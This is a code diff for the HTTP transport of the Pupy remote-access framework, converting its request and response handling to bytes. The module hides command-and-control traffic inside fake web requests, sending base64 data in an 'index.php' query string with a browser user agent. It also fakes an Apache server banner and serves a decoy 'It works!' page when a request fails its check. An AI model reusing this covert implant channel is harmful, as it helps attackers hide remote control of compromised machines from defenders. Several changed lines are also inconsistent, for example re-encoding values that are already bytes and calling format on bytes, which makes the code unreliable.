@@ -3,6 +3,10 @@
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
 """ This module contains an implementation of the 'http' transport for pupy. """
+from __future__ import absolute_import
+from __future__ import division
+from __future__ import print_function
+from __future__ import unicode_literals
 
 __all__ = (
     'InvalidHTTPReq',
@@ -19,22 +23,28 @@ import logging
 import threading
 import time
 
+error_response_body = b'''<html><body><h1>It works!</h1>
+<p>This is the default web page for this server.</p>
+<p>The web server software is running but no content has been added, yet.</p>
+</body></html>'''
+
+error_response = b'\r\n'.join((
+    b'HTTP/1.1 200 OK',
+    b'Server: Apache',
+    b'Content-Type: text/html; charset=utf-8',
+    b'Content-Length: %d' % len(error_response_body),
+    b'\r\n',
+    error_response_body
+))
+
+
 class InvalidHTTPReq(Exception):
     __slots__ = ()
+
 
 class MalformedData(Exception):
     __slots__ = ()
 
-error_response_body="""<html><body><h1>It works!</h1>
-<p>This is the default web page for this server.</p>
-<p>The web server software is running but no content has been added, yet.</p>
-</body></html>"""
-error_response="HTTP/1.1 200 OK\r\n"
-error_response+="Server: Apache\r\n"
-error_response+="Content-Type: text/html; charset=utf-8\r\n"
-error_response+="Content-Length: %s\r\n"%len(error_response_body)
-error_response+="\r\n"
-error_response+=error_response_body
 
 class PupyHTTPTransport(BasePupyTransport):
     """
@@ -42,12 +52,13 @@ class PupyHTTPTransport(BasePupyTransport):
     """
     __slots__ = ()
 
+
 class PupyHTTPClient(PupyHTTPTransport):
     client = True
-    method = 'GET'
+    method = b'GET'
     keep_alive = True
-    path = '/index.php?d='
-    user_agent = 'Mozilla/5.0'
+    path = b'/index.php?d='
+    user_agent = b'Mozilla/5.0'
     host = None # None for random
     proxy = False
     payload_max_size = 1024 * 3
@@ -91,29 +102,37 @@ class PupyHTTPClient(PupyHTTPTransport):
         try:
             d = data.read(self.payload_max_size)
 
-            request = '%s %s%s HTTP/1.1\r\n'%(self.method, self.path, base64.urlsafe_b64encode(d))
+            request = b'%s %s%s HTTP/1.1\r\n'%(
+                self.method, self.path, base64.urlsafe_b64encode(d))
 
             for name, value in self.headers.iteritems():
-                request += '%s: %s\r\n'%(name, value)
+                request += b'%s: %s\r\n'%(
+                    name.encode('ascii'), value.encode('ascii'))
 
             if self.keep_alive:
-                request += 'Connection: keep-alive\r\n'
+                request += b'Connection: keep-alive\r\n'
 
-            request += '\r\n'
+            request += b'\r\n'
 
             if not self.polled:
                 self.polled = True
 
-                request += '%s %s%s HTTP/1.1\r\n'%(
-                    self.method, self.path, 'poll&_={}'.format(time.time()))
+                request += b'%s %s%s HTTP/1.1\r\n'%(
+                    self.method.encode('ascii'), 
+                    self.path.encode('ascii'), 
+                    b'poll&_={}'.format(time.time())
+                )
 
                 for name, value in self.headers.iteritems():
-                    request += '%s: %s\r\n'%(name, value)
+                    request += b'%s: %s\r\n'%(
+                        name.encode('ascii'),
+                        value.encode('ascii')
+                    )
 
                 if self.keep_alive:
-                    request += 'Connection: keep-alive\r\n'
+                    request += b'Connection: keep-alive\r\n'
 
-                request += '\r\n'
+                request += b'\r\n'
 
             self.downstream.write(request)
 
@@ -137,14 +156,14 @@ class PupyHTTPClient(PupyHTTPTransport):
         poll_required = False
         #let's parse HTTP responses :
 
-        while len(d)>0 and d.startswith('HTTP/1.1 ') and '\r\n\r\n' in d:
-            head, rest = d.split('\r\n\r\n', 1)
-            fl, rheaders = head.split('\r\n',1)
+        while len(d)>0 and d.startswith(b'HTTP/1.1 ') and b'\r\n\r\n' in d:
+            head, rest = d.split(b'\r\n\r\n', 1)
+            _, rheaders = head.split(b'\r\n',1)
             content_length = None
-            for name, value in [[i.strip() for i in x.split(':',1)] for x in rheaders.split('\r\n')]:
-                if name.lower() == 'content-length':
+            for name, value in [[i.strip() for i in x.split(b':',1)] for x in rheaders.split(b'\r\n')]:
+                if name.lower() == b'content-length':
                     content_length = int(value)
-                elif name.lower() == 'x-poll-required':
+                elif name.lower() == b'x-poll-required':
                     poll_required = True
 
             if content_length is None:
@@ -152,11 +171,12 @@ class PupyHTTPClient(PupyHTTPTransport):
                 self.close()
                 return
 
-            elif len(rest)<content_length:
+            elif len(rest) < content_length:
                 break
 
             if content_length > 0:
-                decoded_data += base64.urlsafe_b64decode(rest[:content_length])
+                decoded_data += base64.urlsafe_b64decode(
+                    rest[:content_length])
 
             length_to_drain = content_length+4+len(head)
 
@@ -167,23 +187,32 @@ class PupyHTTPClient(PupyHTTPTransport):
         if decoded_data or poll_required:
             self.upstream.write(decoded_data)
 
-            request = '%s %s%s HTTP/1.1\r\n'%(self.method, self.path, 'poll&_={}'.format(time.time()))
+            request = b'%s %s%s HTTP/1.1\r\n'%(
+                self.method.encode('ascii'),
+                self.path.encode('ascii'), 
+                b'poll&_={}'.format(time.time())
+            )
+
             for name, value in self.headers.iteritems():
-                request += '%s: %s\r\n'%(name, value)
+                request += b'%s: %s\r\n'%(
+                    name.encode('ascii'),
+                    value.encode('ascii')
+                )
 
             if self.keep_alive:
-                request += 'Connection: keep-alive\r\n'
+                request += b'Connection: keep-alive\r\n'
 
-            request += '\r\n'
+            request += b'\r\n'
 
             self.downstream.write(request)
 
+
 class PupyHTTPServer(PupyHTTPTransport):
-    client=False
-    response_code='200 OK'
-    server_header='Apache'
-    path='/index.php?d='
-    verify_user_agent=None # set to the user agent to verify or None not to verify
+    client = False
+    response_code = '200 OK'
+    server_header = 'Apache'
+    path = '/index.php?d='
+    verify_user_agent = None # set to the user agent to verify or None not to verify
 
     __slots__ = (
         'headers',  'polled',
@@ -219,17 +248,21 @@ class PupyHTTPServer(PupyHTTPTransport):
                     if self.polled > 0 and (time.time() - self.last_access > self.no_pipelining_timeout):
                         self.polled -= 1
 
-                        response = 'HTTP/1.1 %s\r\n'%self.response_code
+                        response = b'HTTP/1.1 %s\r\n' % self.response_code.encode('ascii')
 
                         for name, value in self.headers.iteritems():
-                            response +='%s: %s\r\n'%(name, value)
+                            response += b'%s: %s\r\n' % (
+                                name.encode('ascii'),
+                                value.encode('ascii')
+                            )
 
-                        response += 'Content-Length: 0\r\n'
+                        response += b'Content-Length: 0\r\n'
 
                         if self.polled == 0:
-                            response += 'X-Poll-Required: true\r\n'
+                            response += b'X-Poll-Required: true\r\n'
 
-                        response += '\r\n'
+                        response += b'\r\n'
+
                         self.downstream.write(response)
 
             time.sleep(self.no_pipelining_timeout)
@@ -255,42 +288,45 @@ class PupyHTTPServer(PupyHTTPTransport):
                 self.pending_data.append(payload)
 
             if encoded_data:
-                response = 'HTTP/1.1 %s\r\n'%self.response_code
+                response = b'HTTP/1.1 %s\r\n' % self.response_code.encode('ascii')
                 for name, value in self.headers.iteritems():
-                    response += '%s: %s\r\n'%(name, value)
+                    response += b'%s: %s\r\n'%(
+                        name.encode('ascii'),
+                        value.encode('ascii')
+                    )
 
-                response += 'Content-Length: %s\r\n'%len(encoded_data)
-                response += '\r\n'
+                response += b'Content-Length: %s\r\n' % len(encoded_data)
+                response += b'\r\n'
                 response += encoded_data
 
                 self.downstream.write(response)
 
     def http_req2data(self, s):
-        if not s.startswith(('GET ', 'POST ', 'HEAD ', 'PUT ')):
+        if not s.startswith((b'GET ', b'POST ', b'HEAD ', b'PUT ')):
             raise InvalidHTTPReq()
 
-        first_line, headers=s.split('\r\n',1)
+        first_line, headers = s.split(b'\r\n', 1)
 
         if self.verify_user_agent is not None:
-            found_ua=False
+            found_ua = False
             try:
-                for name, value in [[i.strip() for i in x.split(':',1)] for x in headers.split('\r\n')]:
-                    if name.lower()=='user-agent':
-                        if value.strip()==self.verify_user_agent.strip():
-                            found_ua=True
+                for name, value in [[i.strip() for i in x.split(b':',1)] for x in headers.split(b'\r\n')]:
+                    if name.lower() == b'user-agent':
+                        if value.strip() == self.verify_user_agent.strip():
+                            found_ua = True
             except:
                 raise MalformedData('invalid user agent')
 
             if not found_ua:
                 raise MalformedData('invalid user agent')
 
-        if not first_line.endswith(' HTTP/1.1'):
+        if not first_line.endswith(b' HTTP/1.1'):
             raise InvalidHTTPReq()
 
         method, path, http_ver=first_line.split()
         payload = path[len(self.path):]
 
-        if payload.startswith('poll'):
+        if payload.startswith(b'poll'):
             return None
 
         try:
@@ -307,11 +343,11 @@ class PupyHTTPServer(PupyHTTPTransport):
 
         d = data.peek()
         decoded_data = b''
-        tab = d.split('\r\n\r\n')
+        tab = d.split(b'\r\n\r\n')
 
         requests = 0
 
-        if not d.endswith('\r\n\r\n'):
+        if not d.endswith(b'\r\n\r\n'):
             tab = tab[:-1] #last part is not complete yet
 
         for req in tab:
@@ -340,13 +376,16 @@ class PupyHTTPServer(PupyHTTPTransport):
                 break
 
             if newdata is not None:
-                response = 'HTTP/1.1 %s\r\n'%self.response_code
+                response = b'HTTP/1.1 %s\r\n'%self.response_code.encode('ascii')
 
                 for name, value in self.headers.iteritems():
-                    response +='%s: %s\r\n'%(name, value)
+                    response += b'%s: %s\r\n'%(
+                        name.encode('ascii'),
+                        value.encode('ascii')
+                    )
 
-                response += 'Content-Length: 0\r\n'
-                response += '\r\n'
+                response += b'Content-Length: 0\r\n'
+                response += b'\r\n'
 
                 with self.polled_lock:
                     self.downstream.write(response)
@@ -367,12 +406,15 @@ class PupyHTTPServer(PupyHTTPTransport):
                         self.polled += 1
 
                     if encoded_data:
-                        response = 'HTTP/1.1 %s\r\n'%self.response_code
+                        response = b'HTTP/1.1 %s\r\n'%self.response_code.encode('ascii')
                         for name, value in self.headers.iteritems():
-                            response += '%s: %s\r\n'%(name, value)
+                            response += b'%s: %s\r\n'%(
+                                name.encode('ascii'),
+                                value.encode('ascii')
+                            )
 
-                        response += 'Content-Length: %s\r\n'%len(encoded_data)
-                        response += '\r\n'
+                        response += b'Content-Length: %s\r\n'%len(encoded_data)
+                        response += b'\r\n'
                         response += encoded_data
 
                         self.downstream.write(response)
